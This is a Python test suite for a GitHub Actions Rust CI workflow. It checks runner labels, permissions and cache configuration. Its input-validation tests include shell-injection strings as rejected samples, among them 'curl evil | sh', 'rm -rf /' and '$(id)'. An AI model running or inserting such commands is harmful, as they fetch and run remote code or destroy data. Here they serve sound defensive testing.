#!/usr/bin/env python3
"""The rust-ci reusable workflow: Sylphx runners only, caller inputs out of
shell bodies, one organization-wide cache namespace, and a cache report."""

from __future__ import annotations

import os
import pathlib
import re
import subprocess
import unittest

import yaml

ROOT = pathlib.Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github" / "workflows" / "rust-ci.yml"
TEMPLATE = ROOT / "workflow-templates" / "rust-ci.yml"


def job() -> dict:
    return yaml.safe_load(WORKFLOW.read_text())["jobs"]["rust"]


def step(name: str) -> dict:
    return next(s for s in job()["steps"] if s.get("name") == name)


def validate(**inputs: str) -> subprocess.CompletedProcess:
    env = {
        "PATH": os.environ["PATH"],
        "HOME": "/tmp",
        "RUNNER_TEMP": "/tmp",
        "GITHUB_ENV": "/dev/null",
        "IN_WORKSPACE": ".",
        "IN_CLASS": "standard",
        "IN_CLIPPY": "--workspace --all-targets -- -D warnings",
        "IN_TEST": "--workspace",
        "IN_APT": "",
        "IN_TOOLCHAIN": "",
        "IN_FEATURES": "",
        "IN_PREFIX": "rustc",
    }
    env.update(inputs)
    return subprocess.run(["bash", "-c", step("Validate inputs")["run"]], env=env, capture_output=True, text=True)


class RustCiWorkflow(unittest.TestCase):
    def setUp(self) -> None:
        self.text = WORKFLOW.read_text()

    def test_inputs_are_not_spliced_into_run_bodies(self) -> None:
        for s in job()["steps"]:
            if "run" in s:
                self.assertNotIn("${{", s["run"], s.get("name"))

    def test_only_sylphx_runner_labels_are_reachable(self) -> None:
        runs_on = job()["runs-on"]
        self.assertIn("sylphx-linux-{0}{1}", runs_on)
        self.assertIn("inputs.runner-class == 'xlarge' && 'xlarge' || 'standard'", runs_on)
        self.assertIn("github.event_name == 'merge_group' && '-merge' || ''", runs_on)
        self.assertNotRegex(self.text, r"(ubuntu|macos|windows)-(latest|\d)")

    def test_job_may_request_an_oidc_token_and_nothing_else_beyond_read(self) -> None:
        # BuildCache authenticates the job by its GitHub OIDC identity.
        self.assertEqual(job()["permissions"], {"contents": "read", "id-token": "write"})
        top = yaml.safe_load(self.text)["permissions"]
        self.assertEqual(top, {"contents": "read"})
        self.assertNotRegex(self.text, r"(?m)^\s+(?!contents|id-token)[a-z-]+: write\s*$")

    def test_one_org_wide_namespace_through_the_shared_action(self) -> None:
        cache = step("Compile cache (sccache)")
        self.assertRegex(cache["uses"], r"^SylphxAI/\.github/\.github/actions/rust-sccache@[0-9a-f]{40}$")
        # The pin carries the buildcache backend (the runner-carried "org" backend is gone).
        self.assertIn("rust-sccache@b051405836fcc2346300b21bd5f3af9e8eae5419", cache["uses"])
        self.assertNotIn("'org'", self.text)
        self.assertEqual(cache["with"]["key-prefix"], "${{ inputs.key-prefix }}")
        spec = yaml.safe_load(self.text)[True]["workflow_call"]["inputs"]
        self.assertEqual(spec["key-prefix"]["default"], "rustc")
        self.assertIn("secrets.SYLPHX_CI_CACHE_ACCESS_KEY", cache["with"]["s3-access-key"])
        names = [s.get("name") for s in job()["steps"]]
        self.assertLess(names.index("Rust toolchain"), names.index("Compile cache (sccache)"))
        for later in ("Format", "Clippy", "Test"):
            self.assertLess(names.index("Compile cache (sccache)"), names.index(later))

    def test_never_uses_the_platform_key_or_a_ref_scoped_key(self) -> None:
        body = "\n".join(l for l in self.text[self.text.index("jobs:"):].splitlines() if not l.strip().startswith("#"))
        for banned in ("RGW_S3", "ci-sccache", "AWS_ACCESS_KEY_ID", "github.ref", "github.head_ref", "github.sha", "run_id"):
            self.assertNotIn(banned, body)

    def test_cache_paths_do_not_depend_on_the_event(self) -> None:
        run = step("Rust toolchain")["run"]
        self.assertIn('CARGO_HOME="$RUNNER_TEMP/cargo-home"', run)
        self.assertNotIn("path:", yaml.safe_dump(step("Checkout").get("with", {})))
        self.assertEqual(job()["env"]["CARGO_INCREMENTAL"], "0")

    def test_toolchain_input_wins_over_the_pin_file(self) -> None:
        run = step("Rust toolchain")["run"]
        self.assertLess(run.index('[ -n "$IN_TOOLCHAIN" ]'), run.index('elif [ -n "$pinned" ]'))

    def test_features_reach_clippy_and_test(self) -> None:
        for name in ("Clippy", "Test"):
            run = step(name)["run"]
            self.assertIn("--all-features", run)
            self.assertIn('--features "$IN_FEATURES"', run)
            self.assertIn('"${feat[@]}"', run)

    def test_reports_the_hit_rate(self) -> None:
        report = step("Cache report")
        self.assertTrue(report["if"].startswith("always()"))
        self.assertIn("GITHUB_STEP_SUMMARY", report["run"])
        self.assertIn("Cache hits rate", report["run"])


class ValidateInputs(unittest.TestCase):
    def test_defaults_pass(self) -> None:
        self.assertEqual(validate().returncode, 0)

    def test_accepts_the_documented_values(self) -> None:
        for field, ok in (
            ("IN_TOOLCHAIN", "1.85.0"),
            ("IN_TOOLCHAIN", "nightly-2026-09-01"),
            ("IN_FEATURES", "all"),
            ("IN_FEATURES", "serde,tokio/full"),
            ("IN_PREFIX", "rustc-2"),
        ):
            self.assertEqual(validate(**{field: ok}).returncode, 0, (field, ok))

    def test_rejects_shell_in_args(self) -> None:
        for field, bad in (
            ("IN_CLIPPY", "--workspace; curl evil | sh"),
            ("IN_TEST", "$(id)"),
            ("IN_APT", "libfoo && rm -rf /"),
            ("IN_WORKSPACE", "../other"),
            ("IN_WORKSPACE", "/etc"),
            ("IN_CLASS", "ubuntu-latest"),
            ("IN_TOOLCHAIN", "stable; id"),
            ("IN_FEATURES", "a b"),
            ("IN_FEATURES", "a$(id)"),
            ("IN_PREFIX", ""),
            ("IN_PREFIX", "../x"),
            ("IN_PREFIX", "a b"),
        ):
            out = validate(**{field: bad})
            self.assertEqual(out.returncode, 2, (field, bad))


class Template(unittest.TestCase):
    def test_rust_job_grants_the_oidc_permission_the_reusable_job_needs(self) -> None:
        # A called workflow can only narrow its caller's token.
        rust = yaml.safe_load(TEMPLATE.read_text())["jobs"]["rust"]
        self.assertEqual(rust["permissions"], {"contents": "read", "id-token": "write"})
        self.assertEqual(yaml.safe_load(TEMPLATE.read_text())["permissions"], {"contents": "read"})

    def test_reaches_only_sylphx_runner_labels(self) -> None:
        jobs = yaml.safe_load(TEMPLATE.read_text())["jobs"]
        self.assertNotRegex(TEMPLATE.read_text(), r"(ubuntu|macos|windows)-(latest|\d)")
        self.assertTrue(jobs["ci-ok"]["runs-on"].startswith("sylphx-"))

    def test_main_push_warms_the_cache(self) -> None:
        on = yaml.safe_load(TEMPLATE.read_text())[True]
        self.assertEqual(on["push"]["branches"], ["main"])
        self.assertIn("pull_request", on)
        self.assertIn("merge_group", on)

    def test_only_pull_requests_are_cancelled(self) -> None:
        conc = yaml.safe_load(TEMPLATE.read_text())["concurrency"]
        self.assertEqual(conc["cancel-in-progress"], "${{ github.event_name == 'pull_request' }}")

    def test_calls_the_reusable_workflow(self) -> None:
        jobs = yaml.safe_load(TEMPLATE.read_text())["jobs"]
        self.assertTrue(jobs["rust"]["uses"].startswith("SylphxAI/.github/.github/workflows/rust-ci.yml@"))
        self.assertEqual(jobs["ci-ok"]["runs-on"], "sylphx-linux-control")


if __name__ == "__main__":
    unittest.main()
